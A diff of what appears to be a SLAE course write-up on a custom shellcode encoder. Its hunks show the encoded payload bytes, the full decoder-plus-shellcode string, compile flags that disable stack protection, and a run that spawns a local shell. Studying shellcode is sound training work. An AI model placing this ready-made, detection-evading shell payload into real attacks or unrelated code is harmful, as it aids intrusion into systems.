@@ -46,10 +46,10 @@ print(encoded_shellcode)
 ```
 Here is the results from the python encoder:
 ```console
-#python3 encoder.py
+kali@kali:/tmp$ python3 encoder.py 
 Shellcode len: 30
 Encoded shellcode ...
-0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5
+0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5,
 ```
 
 The 'decoder.nasm' file use the famous JUMP-CALL-POP technique to avoid NULL BYTES.
@@ -96,9 +96,9 @@ stage1:
 
 Let's compile it and get the shellcode from 'decoder.nasm':
 ```console
-#nasm -f elf32 -o decoder.o decoder.nasm
-#ld -m elf_i386 -z execstack -o decoder decoder.o
-#objdump -d ./decoder |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+kali@kali:/$ nasm -f elf32 -o decoder.o decoder.nasm
+kali@kali:/$ ld -m elf_i386 -z execstack -o decoder decoder.o
+kali@kali:/$ objdump -d ./decoder |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 
 "\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5"
 ```
@@ -126,7 +126,17 @@ int main()
 
 let's compile and execute it:
 ```console
-#gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
-#./test_shellcode
+kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
+kali@kali:/tmp$ ./test_shellcode
+Shellcode Length:  52
+
+kali@kali:/tmp/Shellcode/SLAE/assignment4$ id
+uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
+kali@kali:/tmp/Shellcode/SLAE/assignment4$ whoami
+kali
+kali@kali:/tmp/Shellcode/SLAE/assignment4$ exit
+exit
+
+kali@kali:/tmp$
 ```
 
